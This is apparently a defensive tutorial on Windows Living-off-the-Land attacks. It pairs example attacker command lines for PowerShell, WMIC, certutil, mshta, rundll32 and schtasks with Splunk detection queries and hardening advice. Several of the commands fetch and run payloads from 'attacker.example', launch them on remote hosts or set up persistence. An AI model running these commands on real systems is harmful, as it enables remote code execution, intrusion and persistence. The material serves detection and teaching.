# What is Living-Off-The-Land (LoL) Attack?

A "Living off the Land" (LOTL) attack is a cybercrime method where hackers use legitimate, pre-installed system tools to do harm instead of bringing in outside malware. The main components of this technique are using native administrative tools, bypassing traditional security alerts, and blending in with normal network activity.

## Common LoL Tools and Techniques

Commonly abused tools provide scripting, management, file handling, or scheduling capabilities, which match common attacker needs like execution, persistence, reconnaissance, and lateral movement. Examples include:

- **Powershell** is used for in-memory scripting, remote downloads, and automation.
- **WMIC or WMI** is used to run commands locally or on remote hosts and to query system state.
- **Certutil** is used to fetch files and encode or decode payloads.
- **Mshta** is used to run HTA content or an inline script delivered by a document or link.
- **Rundll32** is used to invoke DLL exports or trigger URL handlers.
- **Scheduled tasks (schtasks)** are used to run code at logon or on a schedule for persistence.

Operators also abuse signed admin utilities from the Sysinternals suite, for example PsExec for remote execution, and Autoruns for persistence discovery and manipulation, because those tools blend with legitimate admin workflows.

Living Off the Land methods are not limited to Windows; similar approaches exist on Unix and Linux, and public collections document common patterns for both platforms, for example, LOLBAS for Windows and GTFOBins for Unix. Knowing which tools are most likely to be misused, and the typical goals behind those uses, helps defenders tune logging, capture full command lines and process trees, and prioritise alerts when normally benign binaries behave in clearly malicious ways.

Some measures we can take to reduce the attack surface and improve response include the following:

- Apply layered defensive controls that combine endpoint, network, and identity protections.
- Implement application control policies such as AppLocker or Windows Defender Application Control to define which scripts and executables are permitted to run.
- Enforce/Use the principles of least privilege by ensuring only administrators can access or use system management utilities.
- Configure network rules and DNS filters to block or redirect connections to domains and IPs known for malicious activity.
- Maintain clear containment playbooks that outline the steps for isolating compromised systems and revoking exposed credentials.
- Regularly review and update access permissions, logging coverage, and control lists to adapt to new attack methods.

## Detecting LOL Activity - POWERSHELL

Attackers use PowerShell because it can run scripts directly in memory without creating files, automate many system actions, interact with the network, and bypass some execution policies. Common purposes include downloading payloads, gathering information, running code stealthily, or modifying system settings.

> `PS C:\> powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object System.Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"`
> `PS C:\> powershell -NoP -NonI -W Hidden -EncodedCommand SQBn...Base64...`
> `PS C:\> powershell -NoP -NonI -Command "Invoke-WebRequest 'http://attacker.example/file.exe' -OutFile 'C:\Users\Public\updater.exe'; Start-Process 'C:\Users\Public\updater.exe'"`

In the above example, the first command uses the IEX (DownloadString) pattern to let an attacker fetch a script from a remote server and run it immediately in memory, avoiding disk artefacts and slowing detection.  In the second command, -EncodedCommand hides the payload in base64, so human reviewers and simple log filters may miss the intent. Finally, it downloads and executes the file.exe.

An example detection is shown below:

`index=wineventlog OR index=sysmon (EventCode=4688 OR EventCode=1 OR EventCode=4104) (CommandLine="*powershell*IEX*" OR CommandLine="*powershell*-EncodedCommand*" OR CommandLine="*powershell*-Exec Bypass*" OR CommandLine="*Invoke-WebRequest*" OR CommandLine="*DownloadString*" OR CommandLine="*Invoke-RestMethod*")| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine`

## WMIC

WMIC (Windows Management Instrumentation Command-line) lets administrators query and manage local or remote Windows systems. It is commonly used by threat actors to execute commands remotely, through starting processes.
Attackers use WMIC to execute commands or create processes remotely, collect system information, or establish persistence without using external binaries. It blends with admin behaviour and is often allowed in restricted environments.

> `PS C:\> wmic /node:TARGETHOST process call create "powershell -NoP -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"`
> `PS C:\> wmic /node:TARGETHOST process get name,commandline`
> `PS C:\> wmic process call create "notepad.exe" /hidden`

In the first WMIC command, the operator targets a remote host and requests that the remote system create a new process. That new process is a PowerShell instance that downloads and executes a remote script, so WMIC acts as a remote launcher. Then, in the second WMIC command, the tool queries the remote system for its running processes and command lines, returning structured info useful for reconnaissance across hosts.
In the third WMIC command, the local WMIC process call create API is used to spawn notepad.exe On the same machine, the optional hiding flag demonstrates how an attacker might try to make a spawned process less visible.

An example detection alert can be found below:

`index=sysmon OR index=wineventlog (EventCode=1 OR EventCode=4688) (CommandLine="*\\wmic.exe*process call create*" OR CommandLine="*wmic /node:* process call create*" OR CommandLine="*wmic*process get Name,CommandLine*") | stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine`

## Certutil

Certutil is a Microsoft tool used for managing certificates and encoding or decoding data. Certutil is intended for certificate management; it can download files with-urlcache, and it can decode base64 payloads, turning text blobs into binaries. Attackers use it because it is signed by Microsoft and common in admin workflows. It can place files without using curl or similar software, and it bypasses some simple blocking rules.

Threat actors use Certutil to download files, decode base64-encoded payloads, or disguise malicious code as legitimate certificate operations. Its network and file-handling capabilities make it a versatile tool for staging payloads or decoding encrypted scripts.

> `PS C:\> certutil -urlcache -split -f "http://attacker.example/payload.exe" C:\Users\Public\payload.exe`
> `PS C:\> certutil -decode C:\Users\Public\encoded.b64 C:\Users\Public\decoded.exe`
> `PS C:\> certutil -encode C:\Users\Public\payload.exe C:\Users\Public\payload.b64`

In the first certutil command, the -urlcache -split -f flags instruct certutil to fetch the remote URL and write it to the specified local path; the result is a file dropped on disk that can be executed later.
In the second command, certutil reads a base64 text file encoded.b64, decodes it, and writes the resulting binary to decoded.exe, so an attacker can transport a binary as text, then reconstruct it on the host.

Example alert:

`index=sysmon OR index=wineventlog (EventCode=1 OR EventCode=4688 OR EventCode=4663) (Image="*\\certutil.exe" OR CommandLine="*certutil*") (CommandLine="* -urlcache * -f *" OR CommandLine="* -decode *" OR CommandLine="* -encode *") | stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine`

## MSHTA

Mshta runs HTML Application (HTA) files, which can contain VBScript or JavaScript code.

> `PS C:\> mshta "http://attacker.example/payload.hta"`
> `PS C:\> mshta "javascript:var s=new ActiveXObject('WScript.Shell');s.Run('powershell -NoP -NonI -W Hidden -Command "Start-Process calc.exe"');close();"`
> `PS C:\> mshta "C:\Users\Public\malicious.hta"`

Example alert:

`index=sysmon (EventCode=1 OR EventCode=4688) Image="*\\mshta.exe" (CommandLine="*http*://*" OR CommandLine="*javascript:*" OR CommandLine="*.hta") | stats count by host, user, ParentImage, CommandLine`

## Rundll32

Rundll32 executes specific exported functions from DLL files.

> `PS C:\> rundll32.exe C:\Users\Public\backdoor.dll,Start`
> `PS C:\> rundll32.exe url.dll,FileProtocolHandler "http://attacker.example/update.html"`
> `PS C:\> rundll32.exe C:\Windows\Temp\loader.dll,Run`

In the first rundll32 command, rundll32 loads the specified DLL and calls its exported Start function, which runs the DLL's code.
In the second rundll32 command, rundll32 invokes url.dll with FileProtocolHandler and a remote URL, causing the system handler to process the remote content, which can bootstrap further activity.
The third rundll32 command is called a crafted export in a temporary DLL, which may execute embedded loader logic or shellcode from a file placed in a writable location.

Example alert:

`index=sysmon (EventCode=1 OR EventCode=4688 OR EventCode=7) Image="*\\rundll32.exe" (CommandLine="*\\Users\\Public\\*" OR CommandLine="*url.dll,FileProtocolHandler*" OR CommandLine="*\\Windows\\Temp\\*") | stats count by host, user, ParentImage, CommandLine`

## Scheduled tasks (Schtasks/Task Scheduler)

Task Scheduler is a built-in Windows automation; it lets administrators run programs or scripts at specified times, on events such as logon, or on a repeating schedule. Tasks have a name, a trigger (when to run), an action (what to run), and an optional run-as account and conditions. Because it is a standard admin facility, tasks show up in normal system logs and are often allowed by policy, making it a valuable mechanism for both legitimate ops and attacker persistence.

Attackers create or modify tasks to achieve persistence across reboots, to run code at user logon or on a regular cadence, or to quickly re-launch payloads after they remove other artefacts. They often pick task names that look benign, for example, WindowsUpdate or Maintenance, to avoid drawing attention. Tasks can run PowerShell, signed tools, or local scripts.

> `PS C:\> schtasks /Create /SC ONLOGON /TN "WindowsUpdate" /TR "powershell -NoP -NonI -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.example/ps1')\""`
> `PS C:\> schtasks /Create /SC DAILY /TN "DailyJob" /TR "C:\Users\Public\encrypt.ps1" /ST 00:05`
> `PS C:\> schtasks /Run /TN "WindowsUpdate"`

Example Alert:

`index=wineventlog EventCode=4698 OR EventCode=4699 OR index=sysmon (EventCode=1 OR EventCode=4688) (CommandLine="*schtasks* /Create*" OR CommandLine="*schtasks* /Run*" OR Image="*\\taskeng.exe" OR EventCode=4698) | stats count by host, user, EventCode, TaskName, CommandLine`

